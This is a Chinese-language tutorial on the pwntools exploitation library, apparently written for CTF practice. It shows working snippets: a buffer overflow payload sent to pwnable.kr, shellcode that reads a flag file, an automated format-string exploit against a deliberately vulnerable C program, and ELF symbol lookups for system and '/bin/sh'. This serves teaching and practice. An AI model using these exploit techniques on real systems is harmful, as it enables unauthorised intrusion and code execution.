# Pwntools

## remote

```python
from pwn import *
c = remote("pwnable.kr", 9000)
c.sendline("AAAA" * 13 + p32(0xcafebabe))
c.interactive()
```

`remote("domain/ip", port)`

- `send(payload)` 发送payload
- `sendline(payload)` 发送payload，并进行换行（末尾**\n**）
- `sendafter(some_string, payload)` 接收到 some_string 后, 发送你的 payload
- `recvn(N)` 接受 N(数字) 字符
- `recvline()` 接收一行输出
- `recvlines(N)` 接收 N(数字) 行输出
- `recvuntil(some_string)` 接收到 some_string 为止

`p32`可以转换整数到小端序.同样存在`p16 p64`

## process

```python
from pwn import *
 
p = process("./asm")
context.log_level = 'DEBUG'
gdb.attach(p)
 
context(arch='amd64', os='linux')
 
shellcode = shellcraft.amd64.pushstr("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong")
shellcode += shellcraft.amd64.linux.open('rsp',0,0)
shellcode += shellcraft.amd64.linux.read('rax','rsp',0)
shellcode += shellcraft.amd64.linux.write(1, 'rsp', 100)
 
p.recvuntil('shellcode: ')
p.send(asm(shellcode))
log.success(p.recvall())
```

`process` 和`remote`类似. `process` 则通过你声明的二进制文件路径在本地创建新的进程. 除了 I/O, `process` 返回的对象可以通过 `gdb.attach(p)` 将进程attach到gdb上. Attach 之后, gdb 便可以调试该程序来 (设置 breakpoints, 查看 stack, 以及简单的反汇编). 

 当我们想查看服务器输出时，并不需要在每个 `recvline` 或者 `recvuntil` 前加 `print`. 当 `context.log_level` 被设置为 `"DEBUG"` , 我们的输入和服务器的输出会被直接输出 

 `shellcraft` 是一个帮忙生成shellcode的类. 在我们的例子中, 我们 *open* 了一个文件并 *read* 文件到 *stdout*. 关于这个类更多的文档, 你可以查阅 [官方文档](http://docs.pwntools.com/en/stable/shellcraft.html). 

## FmtStr

```python
from pwn import *
import tempfile
 
program = tempfile.mktemp()
source  = program + ".c"
write(source, '''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#define MEMORY_ADDRESS ((void*)0x11111000)
#define MEMORY_SIZE 1024
#define TARGET ((int *) 0x11111110)
int main(int argc, char const *argv[])
{
       char buff[1024];
       void *ptr = NULL;
       int *my_var = TARGET;
       ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
       if(ptr != MEMORY_ADDRESS)
       {
               perror("mmap");
               return EXIT_FAILURE;
       }
       *my_var = 0x41414141;
       write(1, &my_var, sizeof(int *));
       scanf("%s", buff);
       dprintf(2, buff);
       write(1, my_var, sizeof(int));
       return 0;
}''')
cmdline = ["gcc", source, "-Wno-format-security", "-m32", "-o", program]
process(cmdline).wait_for_close()
def exec_fmt(payload):
    p = process(program)
    p.sendline(payload)
    return p.recvall()
 
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
p = process(program, stderr=PIPE)
addr = u32(p.recv(4))
payload = fmtstr_payload(offset, {addr: 0x1337babe})
p.sendline(payload)
print hex(unpack(p.recv(4)))
```

 有了 `FmtStr`, 我们不用算偏移量算到疯. 我们需要先构造一个可以接收我们输入并返回格式化字符串输出的函数. 接着，我们可以得到 `autofmt`. 这个对象包含 `offset`, 即算好的偏移量. `fmtstr_payload(offset, {address: value})` 帮我们生成最后的payload. 第一个参数 `offset` 用 `autofmt.offset` 算好的即可. 然后, 我们需要声明 `{address: value}` 来覆盖address的内容成对应的value. 我们还可以同时改写多个地址: `{address1: value1, address2:value2,..., address: valueN}`. 

 有些情况不能自动生成payload. 以下文档介绍了如何手动生成payload [fmtstr_payload](http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload). 

## ELF()

 有些题目给了我们libc. 用 `gdb> x function1 — function2` 算偏移量太麻烦了, 因此有了 `ELF`. 

```python
from pwn import *
 
e = ELF('./example_file')
print hex(e.address)  # 0x400000
print hex(e.symbols['write']) # 0x401680
print hex(e.got['write']) # 0x60b070
print hex(e.plt['write']) # 0x401680
offset = e.symbols['system'] - e.symbols['printf'] # calculate offset
binsh_address = next(e.search('/bin/sh\x00')) # find address which contains /bin/sh
```

和 `process()` 一样, 我们只用将路径给 `ELF(path)` 即可分析 ELF.

 

我们有以下几种方法操纵ELF:

- `symbols['a_function']` 找到 `a_function` 的地址
- `got['a_function']` 找到 `a_function`的 got
- `plt['a_function']` 找到 `a_function` 的 plt
- `next(e.search("some_characters"))` 找到包含 `some_characters`（字符串，汇编代码或者某个数值）的地址.

 https://bbs.pediy.com/thread-247217.htm 